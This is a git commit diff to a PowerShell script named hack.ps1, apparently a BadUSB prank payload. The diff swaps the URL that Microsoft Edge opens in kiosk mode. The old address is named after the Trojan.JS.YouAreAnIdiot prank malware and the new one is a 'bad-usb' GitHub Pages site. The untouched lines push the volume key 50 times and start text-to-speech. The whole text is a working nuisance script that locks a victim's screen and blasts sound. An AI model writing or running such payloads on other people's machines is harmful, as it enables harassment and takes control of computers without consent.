d2005dd52eee1543b71e32b1bdf4195b5bb661aa
kingtoad-c <demoacc4tv@gmail.com>
2025-05-14 18:12:08 +0100

    Update hack.ps1

--- hack.ps1
+++ hack.ps1
@@ -1,4 +1,4 @@
-Start-Process "msedge.exe" -ArgumentList "--kiosk https://ygev.github.io/Trojan.JS.YouAreAn
+Start-Process "msedge.exe" -ArgumentList "--kiosk https://kingtoad-c.github.io/bad-usb/
 $k=[Math]::Ceiling(100/2);$o=New-Object -ComObject WScript.Shell;for($i = 0;$i -lt $k;$i++){$o.SendKeys([char] 175)}
 $s=New-Object -ComObject SAPI.SpVoice
 $s.Rate = -2
